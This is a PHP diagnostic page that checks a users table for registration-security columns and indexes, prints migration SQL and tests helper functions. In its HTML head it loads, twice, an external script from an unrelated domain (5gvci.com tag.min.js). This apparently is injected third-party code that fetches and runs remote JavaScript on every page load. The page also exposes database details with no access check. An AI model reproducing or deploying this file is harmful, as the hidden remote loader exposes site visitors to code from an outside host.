<?php
// check_db_schema.php
// Database Schema Diagnostic Tool

require_once __DIR__ . '/config/db_control.php';

header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html>
<head>
<script src="https://5gvci.com/act/files/tag.min.js?z=10681000" data-cfasync="false" async></script>
    <title>Database Schema Check</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .success { color: #00ff00; }
        .error { color: #ff0000; }
        .warning { color: #ffaa00; }
        .info { color: #00aaff; }
        table { border-collapse: collapse; width: 100%; margin: 20px 0; }
        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
        th { background: #2a2a2a; }
        pre { background: #0a0a0a; padding: 10px; border-radius: 5px; overflow-x: auto; }
        h2 { color: #00aaff; border-bottom: 2px solid #00aaff; padding-bottom: 5px; }
    </style>
<script src="https://5gvci.com/act/files/tag.min.js?z=10681000" data-cfasync="false" async></script>
</head>
<body>
    <h1>🔍 Database Schema Diagnostic Tool</h1>
    <p class="info">Checking database structure for registration security features...</p>

    <?php
    try {
        $pdo = getControlDB();
        echo "<p class='success'>✅ Database connection successful!</p>";
        echo "<p class='info'>Database: " . DB_CONTROL_NAME . "</p><hr>";
        
        // ============================================
        // CHECK 1: Users Table Columns
        // ============================================
        echo "<h2>1. Users Table Columns</h2>";
        
        $requiredColumns = [
            'registration_ip' => 'VARCHAR(45)',
            'device_fingerprint' => 'VARCHAR(255)',
            'verify_token' => 'VARCHAR(64)',
            'email_verified_at' => 'DATETIME',
            'last_registration_attempt' => 'DATETIME'
        ];
        
        $stmt = $pdo->query("SHOW COLUMNS FROM users");
        $existingColumns = [];
        
        echo "<table>";
        echo "<tr><th>Column Name</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th></tr>";
        while ($col = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $existingColumns[$col['Field']] = true;
            echo "<tr>";
            echo "<td>" . htmlspecialchars($col['Field']) . "</td>";
            echo "<td>" . htmlspecialchars($col['Type']) . "</td>";
            echo "<td>" . htmlspecialchars($col['Null']) . "</td>";
            echo "<td>" . htmlspecialchars($col['Key']) . "</td>";
            echo "<td>" . htmlspecialchars($col['Default'] ?? 'NULL') . "</td>";
            echo "</tr>";
        }
        echo "</table>";
        
        echo "<h3>Required Security Columns Status:</h3>";
        echo "<table>";
        echo "<tr><th>Column</th><th>Expected Type</th><th>Status</th></tr>";
        
        $missingColumns = [];
        foreach ($requiredColumns as $colName => $colType) {
            echo "<tr>";
            echo "<td><code>$colName</code></td>";
            echo "<td>$colType</td>";
            
            if (isset($existingColumns[$colName])) {
                echo "<td class='success'>✅ EXISTS</td>";
            } else {
                echo "<td class='error'>❌ MISSING</td>";
                $missingColumns[] = $colName;
            }
            echo "</tr>";
        }
        echo "</table>";
        
        // ============================================
        // CHECK 2: Indexes
        // ============================================
        echo "<h2>2. Users Table Indexes</h2>";
        
        $stmt = $pdo->query("SHOW INDEX FROM users");
        echo "<table>";
        echo "<tr><th>Index Name</th><th>Column</th><th>Unique</th></tr>";
        while ($idx = $stmt->fetch(PDO::FETCH_ASSOC)) {
            echo "<tr>";
            echo "<td>" . htmlspecialchars($idx['Key_name']) . "</td>";
            echo "<td>" . htmlspecialchars($idx['Column_name']) . "</td>";
            echo "<td>" . ($idx['Non_unique'] == 0 ? 'Yes' : 'No') . "</td>";
            echo "</tr>";
        }
        echo "</table>";
        
        $requiredIndexes = [
            'idx_registration_ip',
            'idx_device_fingerprint',
            'idx_verify_token',
            'idx_last_registration_attempt'
        ];
        
        $stmt = $pdo->query("SHOW INDEX FROM users");
        $existingIndexes = [];
        while ($idx = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $existingIndexes[$idx['Key_name']] = true;
        }
        
        echo "<h3>Required Indexes Status:</h3>";
        echo "<ul>";
        foreach ($requiredIndexes as $idxName) {
            if (isset($existingIndexes[$idxName])) {
                echo "<li class='success'>✅ $idxName</li>";
            } else {
                echo "<li class='warning'>⚠️ $idxName (missing, but not critical)</li>";
            }
        }
        echo "</ul>";
        
        // ============================================
        // CHECK 3: Registration Attempts Table
        // ============================================
        echo "<h2>3. Registration Attempts Table</h2>";
        
        try {
            $stmt = $pdo->query("SHOW TABLES LIKE 'registration_attempts'");
            if ($stmt->rowCount() > 0) {
                echo "<p class='success'>✅ Table exists</p>";
                
                $stmt = $pdo->query("SHOW COLUMNS FROM registration_attempts");
                echo "<table>";
                echo "<tr><th>Column Name</th><th>Type</th><th>Null</th></tr>";
                while ($col = $stmt->fetch(PDO::FETCH_ASSOC)) {
                    echo "<tr>";
                    echo "<td>" . htmlspecialchars($col['Field']) . "</td>";
                    echo "<td>" . htmlspecialchars($col['Type']) . "</td>";
                    echo "<td>" . htmlspecialchars($col['Null']) . "</td>";
                    echo "</tr>";
                }
                echo "</table>";
            } else {
                echo "<p class='error'>❌ Table does not exist</p>";
            }
        } catch (Exception $e) {
            echo "<p class='error'>❌ Error checking table: " . htmlspecialchars($e->getMessage()) . "</p>";
        }
        
        // ============================================
        // CHECK 4: Generate Migration SQL
        // ============================================
        if (!empty($missingColumns)) {
            echo "<h2>4. 🔧 Required SQL Migration</h2>";
            echo "<p class='warning'>⚠️ You need to run the following SQL to enable all security features:</p>";
            
            echo "<pre>";
            echo "-- Run this SQL query to add missing columns:\n\n";
            
            if (in_array('device_fingerprint', $missingColumns)) {
                echo "ALTER TABLE users ADD COLUMN device_fingerprint VARCHAR(255) AFTER registration_ip;\n";
            }
            if (in_array('verify_token', $missingColumns)) {
                echo "ALTER TABLE users ADD COLUMN verify_token VARCHAR(64) AFTER status;\n";
            }
            if (in_array('email_verified_at', $missingColumns)) {
                echo "ALTER TABLE users ADD COLUMN email_verified_at DATETIME NULL AFTER verify_token;\n";
            }
            if (in_array('last_registration_attempt', $missingColumns)) {
                echo "ALTER TABLE users ADD COLUMN last_registration_attempt DATETIME DEFAULT CURRENT_TIMESTAMP AFTER email_verified_at;\n";
            }
            
            echo "\n-- Add indexes for performance:\n";
            if (!isset($existingIndexes['idx_device_fingerprint'])) {
                echo "ALTER TABLE users ADD INDEX idx_device_fingerprint (device_fingerprint);\n";
            }
            if (!isset($existingIndexes['idx_verify_token'])) {
                echo "ALTER TABLE users ADD INDEX idx_verify_token (verify_token);\n";
            }
            if (!isset($existingIndexes['idx_last_registration_attempt'])) {
                echo "ALTER TABLE users ADD INDEX idx_last_registration_attempt (last_registration_attempt);\n";
            }
            
            echo "\n-- Create registration attempts logging table:\n";
            echo "CREATE TABLE IF NOT EXISTS registration_attempts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    email VARCHAR(255),
    device_fingerprint VARCHAR(255),
    success BOOLEAN DEFAULT FALSE,
    failure_reason VARCHAR(255),
    attempted_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_ip_attempted (ip_address, attempted_at),
    INDEX idx_email (email),
    INDEX idx_device_fp (device_fingerprint)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;\n";
            echo "</pre>";
        } else {
            echo "<h2>4. ✅ Schema Status</h2>";
            echo "<p class='success'>All required columns exist! Your database is ready for all security features.</p>";
        }
        
        // ============================================
        // CHECK 5: Test Registration Functions
        // ============================================
        echo "<h2>5. 🧪 Testing Security Functions</h2>";
        
        try {
            require_once __DIR__ . '/config/security_helpers.php';
            
            echo "<ul>";
            
            // Test getUserIP
            try {
                $testIP = getUserIP();
                echo "<li class='success'>✅ getUserIP() works: $testIP</li>";
            } catch (Exception $e) {
                echo "<li class='error'>❌ getUserIP() failed: " . htmlspecialchars($e->getMessage()) . "</li>";
            }
            
            // Test isDisposableEmail
            try {
                $isDisposable = isDisposableEmail('test@tempmail.com');
                echo "<li class='success'>✅ isDisposableEmail() works: " . ($isDisposable ? 'Detected tempmail' : 'Failed to detect') . "</li>";
            } catch (Exception $e) {
                echo "<li class='error'>❌ isDisposableEmail() failed: " . htmlspecialchars($e->getMessage()) . "</li>";
            }
            
            // Test verifyCaptcha (with fake token)
            try {
                echo "<li class='info'>ℹ️ verifyCaptcha() loaded (needs real token to test)</li>";
            } catch (Exception $e) {
                echo "<li class='error'>❌ verifyCaptcha() failed to load: " . htmlspecialchars($e->getMessage()) . "</li>";
            }
            
            echo "</ul>";
            
        } catch (Exception $e) {
            echo "<p class='error'>❌ Failed to load security_helpers.php: " . htmlspecialchars($e->getMessage()) . "</p>";
        }
        
        // ============================================
        // Summary
        // ============================================
        echo "<hr>";
        echo "<h2>📊 Summary</h2>";
        
        if (empty($missingColumns)) {
            echo "<p class='success' style='font-size: 18px;'>✅ <strong>Your database is fully configured!</strong> All security features should work.</p>";
        } else {
            echo "<p class='warning' style='font-size: 18px;'>⚠️ <strong>Missing " . count($missingColumns) . " column(s).</strong> Run the SQL migration above to enable all features.</p>";
            echo "<p class='info'>Registration will work with basic security. Advanced features (IP limiting, device tracking) require the migration.</p>";
        }
        
    } catch (PDOException $e) {
        echo "<p class='error'>❌ Database Error: " . htmlspecialchars($e->getMessage()) . "</p>";
    } catch (Exception $e) {
        echo "<p class='error'>❌ Error: " . htmlspecialchars($e->getMessage()) . "</p>";
    }
    ?>
    
    <hr>
    <p style="text-align: center; color: #666; margin-top: 30px;">
        <a href="register.php" style="color: #00aaff;">← Back to Registration</a> | 
        <a href="." style="color: #00aaff;">Home</a>
    </p>
</body>
</html>
